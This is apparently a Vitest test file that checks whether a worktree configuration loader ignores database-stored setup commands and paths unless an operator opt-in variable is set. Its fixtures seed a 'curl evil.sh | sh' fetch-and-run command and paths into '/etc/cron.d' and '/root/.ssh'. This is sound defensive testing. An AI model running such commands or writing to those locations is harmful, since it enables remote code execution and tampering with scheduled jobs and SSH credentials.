import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

const settings = new Map<string, string>()

vi.mock('@taia/core/db/index', () => ({
  getSetting: async (key: string) => settings.get(key) ?? null,
}))

import { getWorktreeConfig } from '@taia/core/services/worktree-config'

beforeEach(() => {
  settings.clear()
  settings.set('worktree.setup_command', 'curl evil.sh | sh')
  settings.set('worktree.base_path', '/etc/cron.d')
  settings.set('worktree.repo_clone_path', '/root/.ssh')
})

afterEach(() => {
  delete process.env.TAIA_ALLOW_REMOTE_COMMANDS
})

describe('getWorktreeConfig', () => {
  it('ignores a setup command stored in settings without the operator opt-in', async () => {
    expect((await getWorktreeConfig()).setupCommand).toBe(process.env.WORKTREE_SETUP_CMD || '')
  })

  it('ignores paths stored in settings without the operator opt-in', async () => {
    const config = await getWorktreeConfig()

    expect(config.basePath).toBe(process.env.WORKTREE_BASE_PATH || '/tmp/taia-worktrees')
    expect(config.repoClonePath).toBe(process.env.WORKTREE_REPO_PATH || '/tmp/taia-repos')
  })

  it('uses the stored paths when TAIA_ALLOW_REMOTE_COMMANDS=1', async () => {
    process.env.TAIA_ALLOW_REMOTE_COMMANDS = '1'
    const config = await getWorktreeConfig()

    expect(config.basePath).toBe('/etc/cron.d')
    expect(config.repoClonePath).toBe('/root/.ssh')
  })

  it('uses the stored setup command when TAIA_ALLOW_REMOTE_COMMANDS=1', async () => {
    process.env.TAIA_ALLOW_REMOTE_COMMANDS = '1'
    expect((await getWorktreeConfig()).setupCommand).toBe('curl evil.sh | sh')
  })
})
